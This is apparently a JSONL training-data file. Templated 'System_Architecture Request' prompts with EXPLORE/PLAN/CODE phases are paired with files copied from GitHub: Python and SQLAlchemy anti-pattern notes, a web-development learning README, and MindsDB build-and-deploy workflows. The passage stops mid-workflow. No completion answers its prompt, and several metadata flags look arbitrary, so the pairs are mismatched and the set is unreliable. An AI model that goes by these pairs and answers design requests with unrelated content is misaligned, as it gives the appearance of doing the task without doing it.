to consume them. They won't help the developer who's debugging. There needs to be automatic alerting associated to those stats. The logs needs to be surfaced somewhere, ideally next to the higher exception (e.g. let's our `main` function above is used in a web interface - the web interface could say \"additionally, the following logs were generated and display the log). For instance, Sentry can be configured to surface `logger.exception` errors the same way exception are surfaced. Otherwise the developer will still have to read the code to understand what's going on. Also - this won't work with sporadic errors. Those needs to be dealt with properly, and until then, it's better to let them go to your usual alerting tool.\n\nNote that knowing where to catch is very important too. If you're catching\ninside the `toast` function, you might be hiding things a caller would need to\nknow. Since this function is not returning anything, how would you make the\ndifference between a success and a failure? You can't. That's why you want to\nlet it raise, and catch only in the caller, where you have the context to know\nhow you'll handle the exception.\n\n**Re-raise immediately**\n\n```python\nimport statsd\n\n\ndef toast(bread):\n    try:\n        toaster = Toaster()\n        toaster.insert(bread)\n        toaster.toast()\n    except:\n        raise ToastingException('Could not toast bread %r' % bread)\n\n\ndef main():\n    # Note: no exception handling here\n    toast('brioche')\n```\n\n**Be very specific about the exception that are caught**\n\n```python\nimport statsd\n\n\ndef toast(bread):\n    try:\n        toaster = Toaster()\n    except ValueError:\n        # Note that even though we catch, we're still logging + creating\n        # a metric\n        logger.exception('Could not get toaster')\n        statsd.count('toaster.instantiate.error', 1)\n        return\n\n    toaster.insert(bread)\n    toaster.toast()\n\n\ndef main():\n    toast('brioche')\n```\n\n## Raising unrelated/unspecific exception\n\nMost languages have predefined exceptions, including Python. It is important to make sure that the right exception is raised from a semantic standpoint.\n\nBad:\n\n```python\ndef validate(toast):\n    if isinstance(toast, Brioche):\n        # RuntimeError is too broad\n        raise RuntimeError('Invalid toast')\n\n\ndef validate(toast):\n    if isinstance(toast, Brioche):\n        # SystemError should only be used for internal interpreter errors\n        raise SystemError('Invalid toast')\n```\n\nGood:\n\n```python\ndef validate(toast):\n    if isinstance(toast, Brioche):\n        raise TypeError('Invalid toast')\n```\n\n`TypeError` is here perfectly meaningful, and clearly convey the context around the error.\n\n## Unconstrained defensive programming\n\nWhile defensive programming can be a very good technique to make the code more resilient, it can seriously backfire when misused. This is a very similar anti-pattern to carelessly silencing exceptions (see about this anti-pattern in this document).\n\nOne example is to handle an edge case as a generic case at a very low level. Consider the following example:\n\n```python\ndef get_user_name(user_id):\n    url = 'http://127.0.0.1/users/%s' % user_id\n    response = requests.get(url)\n    if response.status == 404:\n        return 'unknown'\n    return response.data\n```\n\nWhile this may look like a very good example of defensive programming (we're returning `unknown` when we can't find the user), this can have terrible repercussions, very similar to the one we have when doing an unrestricted bare `try... except`:\n\n- A new developer might not know about this magical convention, and assume that `get_user_name` is guaranteed to return a true user name.\n- The external service that we're getting user name from might start failing, and returning 404. We would silently return 'unknown' as a user name for all users, which could have terrible repercussions.\n\nA much cleaner way is to raise an exception on 404, and let the caller decide how it wants to handle users that are not found.\n\n## Unnecessarily catching and re-raising exceptions\n\nBad:\n\n```python\ndef toast(bread):\n    try:\n        put_in_toaster(bread)\n    except InvalidBreadException:\n        raise ToastException('Could not toast')\n```\n\nSide note: an unconditional exception catching is considered even worse (see [hiding exceptions](https://github.com/charlax/antipatterns/blob/master/code-antipatterns.md#hiding-exceptions)).\n\nThis is a better pattern because we explicitly state what happened in the exception message:\n\n```python\ndef toast(bread):\n    try:\n        put_in_toaster(bread)\n    except InvalidBreadType as e:\n        raise ToastException('Cannot toast this bread type')\n```\n\nIf we need to do some cleanup or extra logging, it's better to just raise the original exception again. The developer will know exactly what happened.\n\n```python\ndef toast(bread):\n    try:\n        put_in_toaster(bread)\n    except:\n        print 'Got exception while trying to toast'\n        raise  # note the absence of specific exception\n```\n\nHere's what would happen:\n\n```\nGot exception while trying to toast\nTraceback (most recent call last):\n  File \"reraise_exceptions_good.py\", line 20, in <module>\n    toast(Bread('yellow'))\n  File \"reraise_exceptions_good.py\", line 10, in toast\n    put_in_toaster(bread)\n  File \"reraise_exceptions_good.py\", line 17, in put_in_toaster\n    brad.color = 'light_brown'  # Note the typo\nNameError: global name 'brad' is not defined\n```\n\nAnother way to show how absurd the anti-pattern becomes at scale is through an example:\n\n```python\ndef call_1():\n    try:\n        call_2()\n    except Call2Exception:\n        raise Call1Exception()\n\n\ndef call_2():\n    try:\n        call_3()\n    except Call3Exception:\n        raise Call2Exception()\n\n\ndef call_3():\n    ...\n```\n\nAnother problem with this pattern is that you can consider it quite useless to do all of this catch/re-raise, since you will still need to catch at the end. In other words:\n\n> Error handling, and recovery are best done at the outer layers of your code base. This is known as the end-to-end principle. The end-to-end principle argues that it is easier to handle failure at the far ends of a connection than anywhere in the middle. If you have any handling inside, you still have to do the final top level check. If every layer atop must handle errors, so why bother handling them on the inside?\n\n_[Write code that is easy to delete, not easy to extend](http://programmingisterrible.com/post/139222674273/write-code-that-is-easy-to-delete-not-easy-to)_\n\nA better way:\n\n```python\n# This is the highest level function where we have enough\n# context to know how to handle the exceptions\ndef call_1():\n    try:\n        call_2()\n    except Call2Exception:\n        # handle it...\n        pass\n    except Call3Exception:\n        # handle it...\n        pass\n\n\ndef call_2():\n    # Do not handle anything here.\n    call_3()\n\n\ndef call_3():\n    ...\n```\n\nMore resources:\n\n- [Hiding exceptions](https://github.com/charlax/antipatterns/blob/master/code-antipatterns.md#hiding-exceptions)) anti-pattern.\n", "metadata": {"source": "github.com/charlax/professional-programming", "file_path": "antipatterns/error-handling-antipatterns.md", "language": "markdown", "complexity": "complex", "star_count": 47841, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 328}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<!-- START doctoc generated TOC please keep comment here to allow auto update -->\n<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->\n## Table of Contents\n\n- [SQLAlchemy Anti-Patterns](#sqlalchemy-anti-patterns)\n  - [Abusing lazily loaded relationships](#abusing-lazily-loaded-relationships)\n  - [Explicit session passing](#explicit-session-passing)\n  - [Implicit transaction handling](#implicit-transaction-handling)\n  - [Loading the full object when checking for object existence](#loading-the-full-object-when-checking-for-object-existence)\n  - [Using identity as comparator](#using-identity-as-comparator)\n  - [Returning `None` instead of raising a `NoResultFound` exception](#returning-none-instead-of-raising-a-noresultfound-exception)\n\n<!-- END doctoc generated TOC please keep comment here to allow auto update -->\n\n# SQLAlchemy Anti-Patterns\n\nThis is a list of what I consider [SQLAlchemy](http://www.sqlalchemy.org/)\nanti-patterns.\n\n## Abusing lazily loaded relationships\n\nBad:\n\n```python\nclass Customer(Base):\n\n    @property\n    def has_valid_toast(self):\n        \"\"\"Return True if customer has at least one valid toast.\"\"\"\n        return any(toast.kind == 'brioche' for toast in self.toaster.toasts)\n```\n\nThis suffers from severe performance inefficiencies:\n\n- The toaster will be loaded, as well as its toast. This involves creating and\n  issuing the SQL query, waiting for the database to return, and instantiating\n  all those objects.\n- `has_valid_toast` does not actually care about those objects. It just returns\n  a boolean.\n\nA better way would be to issue a SQL `EXISTS` query so that the database\nhandles this check and only returns a boolean.\n\nGood:\n\n```python\nclass Customer(Base):\n\n    @property\n    def has_valid_toast(self):\n        \"\"\"Return True if customer has at least one valid toast.\"\"\"\n        query = (session.query(Toaster)\n                 .join(Toast)\n                 .with_parent(self)\n                 .filter(Toast.kind == 'brioche'))\n        return session.query(query.exists()).scalar()\n```\n\nThis query might not always be the fastest if those relationships are small,\nand eagerly loaded.\n\n## Explicit session passing\n\nTODO\n\nBad:\n\n```python\ndef toaster_exists(toaster_id, session):\n    ...\n```\n\n## Implicit transaction handling\n\nTODO\n\n## Loading the full object when checking for object existence\n\nBad:\n\n```python\ndef toaster_exists(toaster_id):\n    return bool(session.query(Toaster).filter_by(id=toaster_id).first())\n```\n\nThis is inefficient because it:\n\n- Queries all the columns from the database (including any eagerly loaded joins)\n- Instantiates and maps all data on the Toaster model\n\nThe database query would look something like this. You can see that all columns\nare selected to be loaded by the ORM.\n\n```sql\nSELECT toasters.id AS toasters_id, toasters.name AS toasters_name,\ntoasters.color AS toasters_color\nFROM toasters\nWHERE toasters.id = 1\n LIMIT 1 OFFSET 0\n```\n\nAnd then it just checks if the result is truthy.\n\nHere's a better way to do it:\n\n```python\ndef toaster_exists(toaster_id):\n    query = session.query(Toaster).filter_by(id=toaster_id)\n    return session.query(query.exists()).scalar()\n```\n\nIn this case, we just ask the database about whether a record exists with this\nid. This is obviously much more efficient.\n\n```sql\nSELECT EXISTS (SELECT 1\nFROM toasters\nWHERE toasters.id = 1) AS anon_1\n```\n\n## Using identity as comparator\n\nBad:\n\n```python\ntoasters = session.query(Toaster).filter(Toaster.deleted_at is None).all()\n```\n\nUnfortunately this won't work at all. This query will return all toasters,\nincluding the one that were deleted.\n\nThe way sqlalchemy works is that it overrides the magic comparison methods\n(`__eq__`, `__lt__`, etc.). All comparison methods can be overrode except the\nidentity operator (`is`) which checks for objects identity.\n\nWhat this means is that expression `Toaster.deleted_at is None` will be\nimmediately evaluated by the Python interpreter, and since (presumably)\n`Toaster.deleted_at` is a `sqlalchemy.orm.attributes.InstrumentedAttribute`,\nit's not `None` and thus it's equivalent to doing:\n\n```python\ntoasters = session.query(Toaster).filter(True).all()\n```\n\nWhich obviously renders the filter inoperable, and will return all records.\n\nThere's two ways to fix it:\n\n```python\ntoasters = session.query(Toaster).filter(Toaster.deleted_at == None).all()\n```\n\nHere we use the equality operator, which Python allows overriding. Behind the\nscene, Python calls `Toaster.deleted_at.__eq__(None)`, which gives SQLAlchemy\nthe opportunity to return a comparator that when coerced to a string, will\nevaluate to `deleted_at is NULL`.\n\nMost linter will issue a warning for equality comparison against `None`, so you\ncan also do (this is my preferred solution):\n\n```python\ntoasters = session.query(Toaster).filter(Toaster.deleted_at.is_(None)).all()\n```\n\nSee docs for\n[is\\_](http://docs.sqlalchemy.org/en/rel_1_0/core/sqlelement.html#sqlalchemy.sql.operators.ColumnOperators.is_).\n\n## Returning `None` instead of raising a `NoResultFound` exception\n\nSee [Returning nothing instead of raising NotFound exception](https://github.com/charlax/antipatterns/blob/master/code-antipatterns.md#returning-nothing-instead-of-raising-notfound-exception).\n", "metadata": {"source": "github.com/charlax/professional-programming", "file_path": "antipatterns/sqlalchemy-antipatterns.md", "language": "markdown", "complexity": "medium", "star_count": 47841, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 171}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<!-- START doctoc generated TOC please keep comment here to allow auto update -->\n<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->\n## Table of Contents\n\n- [Learning web development](#learning-web-development)\n  - [Goal of this training](#goal-of-this-training)\n  - [Principles](#principles)\n    - [Meta: learning about learning](#meta-learning-about-learning)\n  - [Roadmap](#roadmap)\n  - [Approach](#approach)\n    - [Pick a powerful text editor and learn its ins and outs](#pick-a-powerful-text-editor-and-learn-its-ins-and-outs)\n    - [Learn the ins and outs of one programming language](#learn-the-ins-and-outs-of-one-programming-language)\n  - [Topic-specific materials](#topic-specific-materials)\n      - [Best practices, attitude](#best-practices-attitude)\n      - [Code architecture and design patterns](#code-architecture-and-design-patterns)\n      - [DB and SQL](#db-and-sql)\n      - [Dev environment, command line and Linux](#dev-environment-command-line-and-linux)\n      - [Distributed systems and system architecture](#distributed-systems-and-system-architecture)\n      - [Network, protocols, HTTP](#network-protocols-http)\n      - [Project management](#project-management)\n      - [Security](#security)\n      - [Version control (git)](#version-control-git)\n  - [Other lists](#other-lists)\n\n<!-- END doctoc generated TOC please keep comment here to allow auto update -->\n\n<!--TOC-->\n\n# Learning web development\n\n## Goal of this training\n\nThis training provides an opinionated ramp-up program for web developers.\n\nPrerequisites: not much, just general knowledge about computers and the Internet.\n\n## Principles\n\n- Focus on the main stuff. A lot of things are learnt on the job anyway.\n- Programming is not only about raw technical knowledge,\n  it's also about best practices.\n- Go wide and go deep.\n- We learn by doing, so this training includes lots of exercises.\n- A lot of videos are included, since they provide hands-on experiences. You\n  can find a LOT more videos here: [hellerve/programming-talks](https://github.com/hellerve/programming-talks) and [talks that changed the way I think about programming](http://www.opowell.com/post/talks-that-changed-the-way-i-think-about-programming/)\n\nNote: this is just a short selection of stuff listed in\n[charlax/professional-programming](https://github.com/charlax/professional-programming).\n\n### Meta: learning about learning\n\nFeel free to checkout some of the articles about [Learning and memorizing](https://github.com/charlax/professional-programming#learning--memorizing)\n\n- Create a learning plan with your learning priorities\n- Consider using flashcards (see Anki for instance)\n- Enjoy the learning experience!\n\n## Roadmap\n\n1. Start with a programming language.\n2. Do a first pass at the web development environment (see introductory resources below)\n    - HTTP and web architecture basics\n    - Git\n    - Docker and `docker-compose`\n    - Command line\n    - Text editor\n3. Write a full-fledged exercise, get it reviewed.\n4. Do the advanced topics\n\n## Approach\n\n### Pick a powerful text editor and learn its ins and outs\n\nVSCode is a strong pick nowadays (I use and obviously prefer Vim :).\n\nMake sure to spend a lot of time in your text editor, watch tutorials about\nadvanced features, install extensions, learn all the main keyboard shortcuts,\nsubscribe to mailing lists about it, etc.\n\nYou will spend most of your time within your text editor. Turn it into\na powerful ally!\n\n### Learn the ins and outs of one programming language\n\nA developer's main tool being the programming language, it is important to\nachieve high proficiency in at least one of them.\n\nI'd recommend starting with Python or TypeScript. For Python, you can have a look at my repo [charlax/python-education](https://github.com/charlax/python-education).\n\nTo ensure you have good command of the language, you should try out some of\nthose exercises:\n\n- [Exercism](https://exercism.io/) (get free code reviews!)\n- [Small Python exercises from charlax/python-education](https://github.com/charlax/python-education/tree/master/learning-python/exercises)\n- [danistefanovic/build-your-own-x](https://github.com/danistefanovic/build-your-own-x) (for instance: build a [git in Python](https://wyag.thb.lt/))\n- [Other list of exercises](https://github.com/charlax/python-education#exercises)\n\nWatch some videos related to your language:\n\n- 🎞 [Top 10 Must-Watch PyCon Talks](https://realpython.com/must-watch-pycon-talks/)\n\nLearn how to handle:\n\n- Regexes\n    - Do exercises, for instance [RegexOne](https://regexone.com/) or [HackerRank](https://www.hackerrank.com/domains/regex).\n- Functional programming\n    - [Functional Programming Fundamentals](https://www.matthewgerstman.com/tech/functional-programming-fundamentals/)\n- Design patterns\n    - E.g. in [Python](https://www.toptal.com/python/python-design-patterns)\n    - [faif/python-patterns](https://github.com/faif/python-patterns)\n    - 🎞 [Design Patterns in Plain English](https://www.youtube.com/watch?v=NU_1StN5Tkk&ab_channel=ProgrammingwithMosh)\n- Tests\n    - [Why bother writing tests at all?](https://dave.cheney.net/2019/05/14/why-bother-writing-tests-at-all)\n- Crazy things in languages\n    - 🎞 [Wat](https://www.destroyallsoftware.com/talks/wat)\n\nIf you have time, learn more programming languages, starting with some that are\n*very* different from your main one:\n\n- Haskell\n- Clojure\n- Kotlin\n- Rust\n- Assembly\n\n## Topic-specific materials\n\n#### Best practices, attitude\n\nRead one of those:\n\n- 📖 [The Pragmatic Programmer: From Journeyman to\n  Master](https://pragprog.com/titles/tpp20/): hands-on the most inspiring and useful book I've read about programming.\n- 📖 [Code Complete: A Practical Handbook of Software\n  Construction](http://www.amazon.com/Code-Complete-Practical-Handbook-Construction/dp/0735619670): a nice addition to The Pragmatic Programmer, gives you the necessary framework to talk about code.\n- [Ten Principles for Growth as an Engineer](https://medium.com/@daniel.heller/ten-principles-for-growth-69015e08c35b), Dan Heller\n\nRead the resources listed under [Must-read articles](https://github.com/charlax/professional-programming#must-read-articles).\n\n#### Code architecture and design patterns\n\nIntroduction:\n\n- Learn about OOP basics: inheritance, abstract/concrete, public/private\n- Learn about DDD (domain driven design), SOLID, MVC, Clean Architecture\n- [An introduction to software design patterns](https://www.coengoedegebure.com/introduction-to-software-design-patterns/). All those patterns are not useful in all languages, but they're applied in most software, so it's important to know about them.\n    - Builder\n    - Factory\n    - Singleton\n    - Adapter\n    - Facade\n    - Chain of Responsibility\n    - Command\n    - Observer\n    - State\n    - Strategy\n    - Visitor\n- 🎞 [Design Patterns in Plain English](https://www.youtube.com/watch?v=NU_1StN5Tkk&ab_channel=ProgrammingwithMosh)\n\nAdvanced:\n\n- Wander in the [Software Architecture Guide](https://martinfowler.com/architecture/)\n- 🎞 [On the Spectrum of Abstraction](https://www.youtube.com/watch?v=mVVNJKv9esE&ab_channel=ReactEurope)\n- 🎞 [Simple Made Easy](https://www.infoq.com/presentations/Simple-Made-Easy/)\n- 🎞 [Zebras All the Way Down](https://youtu.be/fE2KDzZaxvE), Bryan Cantrill\n\n#### DB and SQL\n\nIntroduction:\n\n- Learn basic and advanced SQL: joins, indexes, subqueries.\n- Install Postgres and play with it.\n- [Do those postgres exercises](https://pgexercises.com/)\n\nAdvanced:\n\n- Learn about ORM\n    - 🎞 [Watch this Python introduction to ORMs](https://www.youtube.com/watch?v=P141KRbxVKc&ab_channel=PyCon2014) (with SQLAlchemy)\n\n#### Dev environment, command line and Linux\n\nIntroduction:\n\n- [jlevy/the-art-of-command-line](https://github.com/jlevy/the-art-of-command-line): master the command line, in one page\n- Check the missing semester:\n    - https://missing.csail.mit.edu/2020/course-shell/\n    - https://missing.csail.mit.edu/2020/shell-tools/\n- [Linux Productivity Tools](https://www.usenix.org/sites/default/files/conference/protected-files/lisa19_maheshwari.pdf)\n- Do shell exercises, for instance on [Exercism](https://exercism.io/tracks/bash), [TLDP](https://tldp.org/LDP/abs/html/exercises.html), [HackerRank](https://www.hackerrank.com/domains/shell).\n- Learn about Docker, follow the [Official Docker Tutorial](https://docs.docker.com/get-started/)\n- Learn about Makefile, follow the [Official introduction to\n  Makefiles](https://www.gnu.org/software/make/manual/html_node/Introduction.html).\n\nAdvanced:\n\n- Install/use some of those tools: https://github.com/jondot/awesome-devenv\n- Write your own dotfiles, taking inspiration from [Awesome Dotfiles](https://github.com/webpro/awesome-dotfiles) (you can\n  checkout mines: https://github.com/charlax/dotfiles)\n- 🎞 [8 super heroic Linux commands that you probably aren't using](https://www.youtube.com/watch?v=Zuwa8zlfXSY&ab_channel=EngineerMan)\n- 🎞 [Containers From Scratch](https://www.youtube.com/watch?v=8fi7uSYlOdc&ab_channel=GOTOConferences)\n\n#### Distributed systems and system architecture\n\nIntroduction:\n\n- [donnemartin/system-design-primer](https://github.com/donnemartin/system-design-primer): learn how to design large-scale systems.\n\nAdvanced:\n\n- Consider reading 📖 [Designing Data-Intensive Applications](https://dataintensive.net/).\n- [The Log: What every software engineer should know about real-time data's unifying abstraction](https://engineering.linkedin.com/distributed-systems/log-what-every-software-engineer-should-know-about-real-time-datas-unifying)\n- 🎞 [Mastering Chaos - A Netflix Guide to Microservices](https://www.youtube.com/watch?v=CZ3wIuvmHeM&ab_channel=InfoQ) (by Netflix)\n\nConcepts to look into:\n\n- CAP theorem\n- Weak/strong/eventual consistency\n- Fail-over/replication\n- Load balancer: active-active, active-passive\n- Horizontal vs vertical scaling\n- Reverse proxy, load balancer\n- DB: RDBMS vs. NoSQL, replication, sharding, master-master, denormalization\n- Cache: client caching in browsers, CDN, HTTP headers, object cache, db cache\n- Asynchronism: message queues, back pressure\n- Monitoring and alerting best practices\n\n#### Network, protocols, HTTP\n\nIntroduction:\n\n- [How Does the Internet Work?](https://web.stanford.edu/class/msande91si/www-spr04/readings/week1/InternetWhitepaper.htm)\n- [vasanthk/how-web-works](https://github.com/vasanthk/how-web-works): what happens behind the scenes when we type www.google.com in a browser?\n\nAdvanced:\n\n- Learn about the basics of TCP and UDP\n- Learn the basics of the HTTP protocol: header, verb, status code, TLS, Rest APIs, etc.\n    - 🎞 [Qu'est ce que le HTTP ?](https://grafikart.fr/tutoriels/http-1062), Grafikart\n- Learn about important web-related protocols: DNS, SMTP, SSH\n\n#### Project management\n\nIntroduction:\n\n- [Efficient Software Project Management at its Roots](https://blog.pragmaticengineer.com/efficient-software-project-management-at-its-roots/)\n- [How to Lead a Project - as a Software Engineer](https://blog.pragmaticengineer.com/how-to-lead-a-project-in-software-development/)\n\nAdvanced:\n\n- [TechnicalDebt](https://martinfowler.com/bliki/TechnicalDebt.html)\n- Checkout this section on [charlax/engineering-management](https://github.com/charlax/engineering-management#project-management)\n\n#### Security\n\nIntroduction:\n\n- Learn about the OWASP Top 10\n\nAdvanced:\n\n- Consider reading 📖 [Penetration Testing](https://nostarch.com/pentesting).\n\n#### Version control (git)\n\nIntroduction:\n\n- [Resources to learn Git](https://try.github.io/)\n- 🎞 [Learn Git In 15 Minutes - YouTube](https://www.youtube.com/watch?v=USjZcfj8yxE&ab_channel=ColtSteele)\n- 🎞 [Introduction to Git](https://www.youtube.com/watch?v=ZDR433b0HJY&ab_channel=InfoQ) with Scott Chacon of GitHub\n\nAdvanced topics:\n\n- `git rebase`\n- `git stash`\n- `git revert`\n- The dangers of `git push --force`\n\n## Other lists\n\n- [The Missing Semester of Your CS Education](https://missing.csail.mit.edu/) (MIT).\n- [What every computer science major should know](http://matt.might.net/articles/what-cs-majors-should-know/)\n- [Teach Yourself Computer Science](https://teachyourselfcs.com/)\n- https://github.com/charlax/professional-programming\n- [microsoft/Web-Dev-For-Beginners](https://github.com/microsoft/Web-Dev-For-Beginners): 24 Lessons, 12 Weeks, Get Started as a Web Developer\n", "metadata": {"source": "github.com/charlax/professional-programming", "file_path": "training/web-dev/README.md", "language": "markdown", "complexity": "complex", "star_count": 47841, "quality_score": 0.8300000000000001, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": true, "line_count": 285}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Build and deploy to dev\n\npermissions:\n  contents: read\n\non:\n  pull_request_target:\n    types: [opened, reopened, synchronize, labeled]\n    branches:\n      - 'main'\n\njobs:\n\n  changes:\n    name: Filter changed files\n    runs-on: mdb-dev\n    outputs:\n      not-docs: ${{ steps.filter.outputs.not-docs }}\n    steps:\n      - uses: dorny/paths-filter@v3\n        id: filter\n        with:\n          predicate-quantifier: \"every\"\n          filters: |\n            not-docs:\n              - '!docs/**'  \n              - '!**/*.md'\n\n  # Looks for labels like \"deploy-to-<env>\" attached to a PR so we can deploy to those envs\n  get-deploy-labels:\n    name: Get Deploy Envs\n    runs-on: mdb-dev\n    concurrency:\n      group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}-labels\n      cancel-in-progress: true\n    environment:\n      name: ${{ github.event.pull_request.head.repo.fork && 'manual-approval' || '' }}\n    outputs:\n      deploy-envs: ${{ steps.get-labels.outputs.deploy-envs }}\n    steps:\n      - name: Pull MindsDB Github Actions\n        uses: actions/checkout@v4\n        with:\n          repository: mindsdb/github-actions\n          path: github-actions\n      - id: get-labels\n        uses: ./github-actions/get-deploy-labels\n\n  # Build our docker images based on our bake file\n  build:\n    name: Build Docker Images\n    runs-on: mdb-dev\n    needs: [get-deploy-labels]\n    if: ${{ needs.get-deploy-labels.outputs.deploy-envs != '[]' }}\n    concurrency:\n      group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}-build\n      cancel-in-progress: true\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - name: Pull MindsDB Github Actions\n        uses: actions/checkout@v4\n        with:\n          repository: mindsdb/github-actions\n          path: github-actions\n      # Build the bakefile and push\n      - uses: ./github-actions/docker-bake\n        with:\n          git-sha: ${{ github.event.pull_request.head.sha }}\n          target: cloud-cpu\n          platforms: linux/amd64\n          push-cache: false\n\n  # Push cache layers to docker registry\n  # This is separate to the build step so we can do other stuff in parallel\n  build-cache:\n    name: Push Docker Cache\n    runs-on: mdb-dev\n    needs: [build]\n    concurrency:\n      group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}-cache\n      cancel-in-progress: true\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - name: Pull MindsDB Github Actions\n        uses: actions/checkout@v4\n        with:\n          repository: mindsdb/github-actions\n          path: github-actions\n      # Build the bakefile and push\n      - uses: ./github-actions/docker-bake\n        with:\n          git-sha: ${{ github.event.pull_request.head.sha }}\n          target: cloud-cpu\n          platforms: linux/amd64\n          push-cache: true\n          cache-only: true\n\n  # Call our deployment workflow, so long as this is not a forked PR\n  # This will run the deployment workflow in the base branch, not in the PR.\n  # So if you change the deploy workflow in your PR, the changes won't be reflected in this run.\n  deploy:\n    name: Deploy\n    needs: [build, get-deploy-labels]\n    if: needs.get-deploy-labels.outputs.deploy-envs != '[]'\n    uses: ./.github/workflows/deploy.yml\n    with:\n      deploy-envs: ${{ needs.get-deploy-labels.outputs.deploy-envs }}\n      image-tag: ${{ github.event.pull_request.head.sha }}\n    secrets: inherit\n\n  # Run integration tests against the deployed environment\n  run_tests:\n    name: Run Integration Tests\n    needs: [deploy, get-deploy-labels]\n    strategy:\n      fail-fast: false\n      matrix:\n        deploy-env: ${{ fromJson(needs.get-deploy-labels.outputs.deploy-envs) }}\n    concurrency:\n      group: deploy-${{ matrix.deploy-env }}\n      cancel-in-progress: false\n    uses: ./.github/workflows/test_on_deploy.yml\n    with:\n      git-sha: ${{ github.event.pull_request.head.sha }}\n      deploy-env: ${{ matrix.deploy-env }}\n    secrets: inherit\n\n  tests_completed:\n    needs: [run_tests, changes]\n    runs-on: mdb-dev\n    if: always()\n    steps:\n      - name: fail if tests failed or didnt run\n        if: ${{ needs.run_tests.result != 'success' && needs.changes.outputs.not-docs == 'true' }}\n        run: exit 1\n      - run: echo \"Tests ran successfully\"\n", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": ".github/workflows/build_deploy_dev.yml", "language": "yaml", "complexity": "medium", "star_count": 34810, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 141}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Build and deploy release\n\npermissions:\n  contents: read\n\non:\n  release:\n    types: [published]\n    paths-ignore:\n      - \"docs/**\"\n      - \"README.md\"\n\nenv:\n  UV_LINK_MODE: \"symlink\"\n\njobs:\n  # Check that the version defined in the github release is valid\n  check-version:\n    name: Check Code Version\n    runs-on: mdb-dev\n    if: github.actor != 'mindsdbadmin'\n    concurrency:\n      group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}-check-version\n      cancel-in-progress: true\n    steps:\n      - uses: actions/checkout@v4\n      - uses: FranzDiebold/github-env-vars-action@v2\n      - name: Set up Python\n        uses: actions/setup-python@v5.1.0\n        with:\n          python-version: ${{ vars.CI_PYTHON_VERSION }}\n      - name: Check Version\n        run: |\n          PYTHONPATH=./ python tests/scripts/check_version.py ${{ env.CI_REF_NAME }} ${{ github.event.release.prerelease }}\n\n  # Push a new release to PyPI\n  deploy_to_pypi:\n    name: Publish to PyPI\n    runs-on: mdb-dev\n    needs: check-version\n    if: github.actor != 'mindsdbadmin'\n    concurrency:\n      group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}-pypi\n      cancel-in-progress: true\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup uv\n        uses: astral-sh/setup-uv@v5\n        with:\n          # Place cache in the tool dir because we mount this in our runnners\n          cache-local-path: \"/home/runner/_work/_tool/uv-local-cache\"\n          prune-cache: false\n          python-version: ${{ vars.CI_PYTHON_VERSION || '3.10' }}\n      - name: Install dependencies\n        run: |\n          uv pip install -r requirements/requirements-dev.txt\n      - name: Build and publish\n        env:\n          TWINE_USERNAME: __token__\n          TWINE_PASSWORD: ${{ secrets.PYPI_PASSWORD }}\n        run: |\n          # This uses the version string from __about__.py, which we checked matches the git tag above\n          uv pip install build\n          python -m build\n          twine upload dist/*\n\n  # Build our docker images based on our bake file\n  # This will tag with the release version tag and push to both dockerhub and ECR\n  build:\n    name: Build Docker Images\n    runs-on: mdb-dev\n    needs: [check-version]\n    if: github.actor != 'mindsdbadmin'\n    concurrency:\n      group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}-build\n      cancel-in-progress: true\n    steps:\n      - uses: actions/checkout@v4\n      - name: Docker Login\n        uses: docker/login-action@v1\n        with:\n          username: ${{ secrets.DOCKER_USERNAME }}\n          password: ${{ secrets.DOCKER_PASSWORD }}\n      - name: Pull MindsDB Github Actions\n        uses: 